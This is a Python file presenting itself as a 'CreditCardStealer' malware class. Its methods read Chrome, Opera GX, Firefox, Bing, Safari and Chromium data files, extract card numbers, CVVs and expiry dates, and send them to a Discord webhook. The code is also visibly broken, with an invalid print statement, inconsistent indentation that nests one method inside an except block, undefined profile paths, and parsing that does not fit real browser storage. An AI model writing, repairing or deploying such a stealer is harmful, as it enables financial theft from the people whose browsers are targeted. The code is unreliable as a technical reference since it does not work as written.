import base64
import json
import re
import subprocess
import urllib.request
import zipfile
import requests
import os
import webbrowser
import uuid

print coded by mossy

class CreditCardStealer:
    def __init__(self):
        self.cards = []
        self.webhook_url = "https://discord.com/api/webhooks/<webhook\_id>/<webhook\_token>"

    def steal_chrome_cards(self):
        try:
            with open("C:\\Users\\<username>\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data", "r") as f:
                data = f.read()
                matches = re.findall(r'\"name\":\"(.+?)\",\"password\":\"(.+?)\"', data)
                for name, password in matches:
                    if "cvv" in name.lower():
                        card_number = re.search(r'\d{4} \d{4} \d{4} \d{4}', name).group(0)
                        card_cvv = re.search(r'\d{3}', password).group(0)
                        card_expiry = re.search(r'(\d{2}/\d{2})|(\d{2}\/\d{4})', name).group(0)
                        self.cards.append({"number": card_number, "cvv": card_cvv, "expiry": card_expiry})
        except Exception as e:
            print(f"Error stealing Chrome cards: {e}")
            
            def steal_opera_gx_cards(self):
        try:
            with open(os.path.join(self.opera_gx_profile_path, "Login Data"), "r") as f:
                data = f.read()
                matches = re.findall(r'\"name\":\"(.+?)\",\"password\":\"(.+?)\"', data)
                for name, password in matches:
                    if "cvv" in name.lower():
                        card_number = re.search(r'\d{4} \d{4} \d{4} \d{4}', name).group(0)
                        card_cvv = re.search(r'\d{3}', password).group(0)
                        card_expiry = re.search(r'(\d{2}/\d{2})|(\d{2}\/\d{4})', name).group(0)
                        self.cards.append({"number": card_number, "cvv": card_cvv, "expiry": card_expiry})
        except Exception as e:
            print(f"Error stealing Opera GX cards: {e}")

    def steal_firefox_cards(self):
        try:
            with open("C:\\Users\\<username>\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\<profile\_name>\\key4.db", "rb") as f:
                data = f.read()
                matches = re.findall(r'(\x04\x08\x08\x08)(\w{32})\x07(\w{32})(\x07\x07)', data)
                for encrypted_key, encrypted_value, encrypted_iv, encrypted_hmac in matches:
                    decrypted_data = self.decrypt_data(encrypted_key, encrypted_value, encrypted_iv)
                    if b"payment" in decrypted_data:
                        card_number = re.search(r'\d{4} \d{4} \d{4} \d{4}', decrypted_data.decode()).group(0)
                        card_cvv = re.search(r'\d{3}', decrypted_data.decode()).group(0)
                        card_expiry = re.search(r'(\d{2}/\d{2})|(\d{2}\/\d{4})', decrypted_data.decode()).group(0)
                        self.cards.append({"number": card_number, "cvv": card_cvv, "expiry": card_expiry})
        except Exception as e:
            print(f"Error stealing Firefox cards: {e}")

 
   def steal_bing_cards(self):
        try:
            with open(os.path.join(self.bing_cookies_path, "Cookies"), "r") as f:
                data = f.read()
                matches = re.findall(r'\"name\":\"(.+?)\",\"value\":\"(.+?)\"', data)
                for name, value in matches:
                    if "cvv" in name.lower():
                        card_number = re.search(r'\d{4} \d{4} \d{4} \d{4}', name).group(0)
                        card_cvv = re.search(r'\d{3}', value).group(0)
                        card_expiry = re.search(r'(\d{2}/\d{2})|(\d{2}\/\d{4})', name).group(0)
                        self.cards.append({"number": card_number, "cvv": card_cvv, "expiry": card_expiry})
        except Exception as e:
            print(f"Error stealing Bing cookies: {e}")
        
   def steal_safari_cards(self):
        try:
            with open(self.safari_cookies_path, "rb") as f:
                data = f.read()
                matches = re.findall(b'([a-fA-F0-9]{32})([a-fA-F0-9]{32})([a-fA-F0-9]{32})([a-fA-F0-9]{32})([a-fA-F0-9]{64})([a-fA-F0-9]{128})([a-fA-F0-9]{16})([a-fA-F0-9]{32})([a-fA-F0-9]{32})([a-fA-F0-9]{4})', data)
                for encrypted_key, encrypted_value, encrypted_iv, encrypted_hmac, encrypted_data, hostname, path, expires_utc, is_secure, creation_utc in matches:
                    decrypted_data = self.decrypt_data(encrypted_key, encrypted_iv, encrypted_data)
                    if b"cvv" in decrypted_data:
                        card_number = re.search(br'\d{4} \d{4} \d{4} \d{4}', decrypted_data).group(0)
                        card_cvv = re.search(br'\d{3}', decrypted_data).group(0)
                        card_expiry = re.search(br'(\d{2}/\d{2})|(\d{2}\/\d{4})', decrypted_data).group(0)
                        self.cards.append({"number": card_number.decode(), "cvv": card_cvv.decode(), "expiry": card_expiry.decode()})
        except Exception as e:
            print(f"Error stealing Safari cookies: {e}")
 
    def steal_chromium_cards(self):
        try:
            with open(self.chromium_cookies_path, "r") as f:
                data = f.read()
                matches = re.findall(r'\"name\":\"(.+?)\",\"value\":\"(.+?)\"', data)
                for name, value in matches:
                    if "cvv" in name.lower():
                        card_number = re.search(r'\d{4} \d{4} \d{4} \d{4}', name).group(0)
                        card_cvv = re.search(r'\d{3}', value).group(0)
                        card_expiry = re.search(r'(\d{2}/\d{2})|(\d{2}\/\d{4})', name).group(0)
                        self.cards.append({"number": card_number, "cvv": card_cvv, "expiry": card_expiry})
        except Exception as e:
            print(f"Error stealing Chromium cookies: {e}")

   def send_cards(self):
        try:
            data = json.dumps(self.cards)
            requests.post(self.webhook_url, data={"content": data})
        except Exception as e:
            print(f"Error sending cards: {e}")